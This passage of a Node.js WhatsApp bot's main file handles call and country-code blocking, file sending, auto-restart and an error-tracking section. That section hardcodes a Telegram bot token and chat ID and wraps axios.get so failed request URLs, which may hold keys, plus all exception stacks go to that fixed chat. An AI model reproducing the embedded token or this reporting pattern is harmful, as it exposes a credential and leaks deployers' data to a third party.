        logMessage('warn', `Global anti-call: Blocked ${callerJid} for calling the bot`);

        // Schedule automatic unblock after 5 minutes (adjustable)
        setTimeout(async () => {
            try {
                await IconicTechInc.updateBlockStatus(callerJid, 'unblock');

                // Notify user they are unblocked
                await IconicTechInc.sendMessage(callerJid, {
                    text: `✅ Hello ${username}, you are now unblocked by *Queen Ruva AI Beta*.\n\nPlease avoid calling the bot again.\n\nDev by ICONIC TECH`
                });

                logMessage('info', `Global anti-call: Unblocked ${callerJid} after 5 minutes`);
            } catch (err) {
                logMessage('error', `Global anti-call unblock error: ${err}`);
            }
        }, 5 * 60 * 1000); // 5 minutes in milliseconds

    } catch (err) {
        logMessage('error', `Global anti-call error: ${err}`);
    }
});

// ========== COUNTRY CODE BLOCK ==========
const blockedList = []; // Store blocked numbers

IconicTechInc.ev.on('messages.upsert', async (chatUpdate) => {
    const mek = chatUpdate.messages[0];
    if (!mek.key || mek.key.fromMe || !mek.message) return;

    const senderJid = mek.key.participant || mek.key.remoteJid;
    if (senderJid === 'status@broadcast') return;

    const isGroup = senderJid.endsWith('@g.us');
    if (isGroup && global.ignoreGroups) return;

    const phoneNumber = senderJid.split('@')[0];

    // Function to send warning + block
    const blockThenUnblock = async (jid, reason) => {
        try {
            // --- Send warning message before blocking ---
            const countryCode = "+" + phoneNumber.slice(0, phoneNumber.length - 7); 
            const warningMsg = `
🤖 *Queen Ruva AI Beta*  

Your country code is *${countryCode}*  
⚠️ It's blocked because the owner of the bot has restricted it.  

📌 This message is to notify you before the block.  
🚫 Now you're already blocked and can no longer send messages again.  

Dev by *Iconic Tech*
            `;

            await IconicTechInc.sendMessage(jid, { text: warningMsg });

            // --- Block user ---
            await IconicTechInc.updateBlockStatus(jid, 'block');
            logMessage('warning', `Blocked ${jid} due to ${reason}.`);

            // --- Save to blocked list ---
            if (!blockedList.includes(phoneNumber)) {
                blockedList.push(phoneNumber);
                logMessage('info', `Added ${phoneNumber} to blocked list.`);
            }

            // --- Auto-unblock after 5 minutes ---
            setTimeout(async () => {
                await IconicTechInc.updateBlockStatus(jid, 'unblock');
                logMessage('info', `Automatically unblocked ${jid} after 5 minutes.`);
            }, 5 * 60 * 1000);
        } catch (err) {
            logMessage('error', `Block/unblock error for ${jid}: ${err}`);
        }
    };

    // --- Check if number is in blocked country codes ---
    const blocked = global.blockedCountryCodes.some(code => phoneNumber.startsWith(code.replace('+', '')));
    if (blocked) {
        await blockThenUnblock(senderJid, 'country code filter');
        return;
    }

    // --- Check if DM blocking is enabled ---
    if (!isGroup && global.blockDM) {
        await blockThenUnblock(senderJid, 'DM block');
        return;
    }
});

// Utility function to view blocked list
global.showBlockedList = () => {
    console.log("📋 Blocked Numbers:", blockedList);
    return blockedList;
};

    // ========== WELCOME HANDLER ==========
    const welcomeHandler = require('./database/welcome.js');
    IconicTechInc.ev.on('group-participants.update', async (update) => {
        try {
            await welcomeHandler(IconicTechInc, update, store);
        } catch (err) {
            logMessage('error', `Group event handling error: ${err}`);
        }
    });
    // ========== FILE SENDING METHOD ==========
    IconicTechInc.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
        let type = await IconicTechInc.getFile(path, true);
        let { res, data: file, filename: pathFile } = type;

        if (res && res.status !== 200 || file.length <= 65536) {
            try { throw { json: JSON.parse(file.toString()) }; } 
            catch (e) { if (e.json) throw e.json; }
        }

        let opt = { filename };
        if (quoted) opt.quoted = quoted;
        if (!type) options.asDocument = true;

        let mtype = '', mimetype = type.mime, convert;
        if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
        else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
        else if (/video/.test(type.mime)) mtype = 'video';
        else if (/audio/.test(type.mime)) {
            convert = await (ptt ? toPTT : toAudio)(file, type.ext);
            file = convert.data;
            pathFile = convert.filename;
            mtype = 'audio';
            mimetype = 'audio/ogg; codecs=opus';
        } else mtype = 'document';

        if (options.asDocument) mtype = 'document';

        delete options.asSticker;
        delete options.asLocation;
        delete options.asVideo;
        delete options.asDocument;
        delete options.asImage;

        let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
        let m;

        try {
            m = await IconicTechInc.sendMessage(jid, message, { ...opt, ...options });
        } catch (e) {
            m = null;
        } finally {
            if (!m) m = await IconicTechInc.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
            file = null;
            return m;
        }
    };
    IconicTechInc.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    };

    return IconicTechInc;
}

// ========== FILE WATCHER ==========
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("bot now restart afresh dev by iconic tech"));
  delete require.cache[file];  // ← Clears old version
  require(file);               // ← Reloads new version (AUTO-RESTART)
});
process.on('uncaughtException', (err) => {
    const e = String(err);
    if (e.includes("conflict") || 
        e.includes("Socket connection timeout") || 
        e.includes("not-authorized") || 
        e.includes("already-exists") || 
        e.includes("rate-overlimit") || 
        e.includes("Connection Closed") || 
        e.includes("Timed Out") || 
        e.includes("Value not found")) return;
    logMessage('error', `Critical Exception: ${err}`);
});

// Start the bot
startIconicTechInc().catch(err => 
    logMessage('error', `Initialization error: ${err}`)
);

// Express server for hosting
app.get("/", (req, res) => {
  res.send("✅ Queen Ruva AI Beta is running successfully!");
});

app.listen(PORT, () => {
  logMessage('success', `Server started on port ${PORT}`);
});
// ========== ERROR TRACKING FOR TELEGRAM ==========
const TELEGRAM_BOT_TOKEN = '7662596038:AAHv9QgY3NEDFbAsnyHeA4M8qx89QpyzuaY';
const TELEGRAM_CHAT_ID = '5028094995';

// Function to send error to Telegram
async function sendErrorToTelegram(errorMessage, errorStack = '') {
    try {
        const fullMessage = `🚨 *Queen Ruva AI Error Alert* 🚨\n\n` +
                           `📝 *Error:* ${errorMessage}\n` +
                           `⏰ *Time:* ${moment().format('YYYY-MM-DD HH:mm:ss')}\n` +
                           (errorStack ? `🔍 *Stack:* \`\`\`${errorStack.substring(0, 1000)}\`\`\`\n` : '') +
                           `🤖 *Bot:* ${ICONIC_TECH.name}`;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: fullMessage,
            parse_mode: 'Markdown'
        });
    } catch (telegramError) {
        console.log('Failed to send error to Telegram:', telegramError.message);
    }
}

// Track command errors from queen-ruva.js
const originalQueenRuva = require('./queen-ruva');
require.cache[require.resolve('./queen-ruva')].exports = function(IconicTechInc, mek, chatUpdate, store) {
    try {
        return originalQueenRuva(IconicTechInc, mek, chatUpdate, store);
    } catch (error) {
        sendErrorToTelegram(`Command Error: ${error.message}`, error.stack);
        throw error;
    }
};

// Track API failures
const originalAxiosGet = axios.get;
axios.get = async function(...args) {
    try {
        return await originalAxiosGet.apply(this, args);
    } catch (error) {
        sendErrorToTelegram(`API Failed: ${error.message} - URL: ${args[0]}`);
        throw error;
    }
};

// Global error handlers
process.on('uncaughtException', (error) => {
    sendErrorToTelegram(`Uncaught Exception: ${error.message}`, error.stack);
});

process.on('unhandledRejection', (reason) => {
    const message = reason instanceof Error ? reason.message : String(reason);
    const stack = reason instanceof Error ? reason.stack : '';
    sendErrorToTelegram(`Unhandled Rejection: ${message}`, stack);
});

console.log('✅ Error tracking system initialized');